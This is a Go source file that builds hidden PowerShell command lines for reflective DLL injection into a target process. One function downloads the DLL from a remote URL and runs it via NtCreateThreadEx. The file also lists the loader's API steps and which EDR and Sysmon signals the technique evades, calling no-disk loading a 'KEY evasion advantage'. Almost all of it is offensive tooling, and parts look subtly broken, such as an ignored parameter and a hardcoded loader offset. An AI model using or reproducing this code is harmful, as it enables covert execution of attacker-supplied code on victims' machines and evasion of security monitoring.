package processinjection

import "fmt"

func InjectReflectiveDLL(targetPID int, dllBytes []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if len(dllBytes) == 0 {
		return "", fmt.Errorf("empty DLL bytes")
	}
	_ = dllBytes
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$dllBytes=[System.IO.File]::ReadAllBytes('{{DLLPATH}}'); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,$dllBytes.Length,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$dllBytes,$dllBytes.Length,[ref]0); `+
			`$reflectiveLoader=$addr+0x1000; `+
			`[PoshWin32.Kernel32]::CreateRemoteThread($h,0,0,$reflectiveLoader,0,0,0)"`,
		targetPID,
	), nil
}

func InjectReflectiveDLLRemote(targetPID int, dllURL string) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if dllURL == "" {
		return "", fmt.Errorf("empty DLL URL")
	}
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$wc=New-Object System.Net.WebClient; `+
			`$dllBytes=$wc.DownloadData('%s'); `+
			`$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,$dllBytes.Length,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$dllBytes,$dllBytes.Length,[ref]0); `+
			`$NTDLL=[PoshWin32.Kernel32]::GetModuleHandle('ntdll'); `+
			`$NtCreateTx=[PoshWin32.Kernel32]::GetProcAddress($NTDLL,'NtCreateThreadEx'); `+
			`$delegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateTx,[Func[IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr]]); `+
			`$delegate.Invoke($h,0,0,$addr,0,0,0,0,0,0)"`,
		dllURL, targetPID,
	), nil
}

func ReflectiveDLLAPIMap() map[int]string {
	return map[int]string{
		1: "OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID) -> hProcess",
		2: "VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) -> lpRemoteAddr",
		3: "WriteProcessMemory(hProcess, lpRemoteAddr, dllBytes, dllSize, NULL) -> write DLL to remote process",
		4: "CreateRemoteThread/NtCreateThreadEx(hProcess, NULL, 0, ReflectiveLoaderOffset, NULL, 0, 0) -> run loader",
		5: "ReflectiveLoader internally:",
		6: "   a) Locate kernel32.dll via PEB (PPEB->Ldr->InMemoryOrderModuleList)",
		7: "   b) Resolve LoadLibraryA, GetProcAddress, VirtualAlloc by hash-based export walking",
		8: "   c) Allocate memory for DLL via LocalAlloc/VirtualAlloc",
		9: "   d) Copy DLL headers and sections to allocated memory",
		10: "   e) Resolve import table (IAT) - load required DLLs and resolve function addresses",
		11: "   f) Apply base relocations (.reloc section) for new image base",
		12: "   g) Call DllMain(DLL_PROCESS_ATTACH) to execute DLL entry point",
		13: "   h) Return to caller (thread exit or continue execution)",
	}
}

func ReflectiveDLLDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 8":     "CreateRemoteThread detected if using CreateRemoteThread for loader",
		"Sysmon EventID 7":    "ImageLoaded NOT triggered - DLL never touches disk, no LoadLibrary call - this is KEY evasion advantage",
		"Sysmon EventID 10":    "ProcessAccess detected for OpenProcess",
		"Sysmon EventID 11":    "FileCreate NOT triggered - no file dropped",
		"Sysmon EventID 25":    "ProcessTampering - reflective loaders may trigger process tampering detection",
		"EventID 4688":         "Process Creation if target process is new",
		"CrowdStrike Falcon":   "CS detects via unusual memory allocation + thread creation with memory-backed code execution",
		"SentinelOne":          "S1 may detect reflective loading via memory scanning for MZ/PE headers in private memory",
		"Microsoft Defender":   "MDE detects via memory scan for PE headers in process-private memory without corresponding ImageLoad event",
		"Elastic EDR":          "Elastic detects via 'Reflective DLL Loaded' rule - PE image in memory without disk-backed mapping",
	}
}
